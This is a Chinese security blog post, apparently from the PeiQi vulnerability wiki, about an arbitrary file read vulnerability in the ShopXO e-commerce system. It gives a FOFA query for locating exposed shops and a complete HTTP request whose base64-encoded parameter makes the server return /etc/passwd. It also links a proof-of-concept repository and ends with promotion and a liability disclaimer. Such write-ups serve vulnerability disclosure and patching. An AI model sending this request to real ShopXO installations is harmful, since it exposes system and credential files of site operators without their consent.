> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7f0qibYGLgIyO0zpTSeV1I6m1WibjS1ggK9xf8lYM44SK40O6uRLTOAtiaM0xYOqZicJ2oDdiaWFianIjQ/640?wx_fmt=png)**

**一****：漏洞描述🐑**

**ShopXO 是一套开源的企业级开源电子商务系统。ShopXO 存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息**

**二:  漏洞影响🐇**

**ShopXO**

**三:  漏洞复现🐋**

```
app="ShopXO企业级B2C电商系统提供商"
```

**商城主页如下**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7htH9AibquAMvoqJYD5h1KbUuK0JicIxw5icNZKpOKOVJZrpUEun44USqI9VA1j4icV7Amse1aVs7O2Q/640?wx_fmt=png)

**发送漏洞请求包**

```
GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q= HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

**其中 **/url/xxxx** 中的 base64 解码后为 **/etc/passwd****

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7htH9AibquAMvoqJYD5h1Kb1mNQyhQhA2IIo8TmKMGb5ogibEK6RPTbtbXCDgzOr1dKicgLtKYqkaSg/640?wx_fmt=png)

 ****四:  Goby & POC🦉****

```
https://github.com/PeiQi0
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7htH9AibquAMvoqJYD5h1KbNKa3mtwcib8NmjBt8NlaWOoUiaiahrvDTGGsMmntQoy11s1ibibGhjoIDpg/640?wx_fmt=png)

 ****五:  关于文库🦉****

 **在线文库：**

**http://wiki.peiqi.tech**

 **Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4cpD8uQPH24EjA7YPtyZEP33zgJyPgfbMpTJGFD7wyuvYbicc1ia7JT4O3r3E99JBicWJIvcL8U385Q/640?wx_fmt=png)

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuHPQeSEAhRof2olkAM9ZghicpNv0p8rRbtNCZJL4t82g15Va8iahlCWeg/640?wx_fmt=png)

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**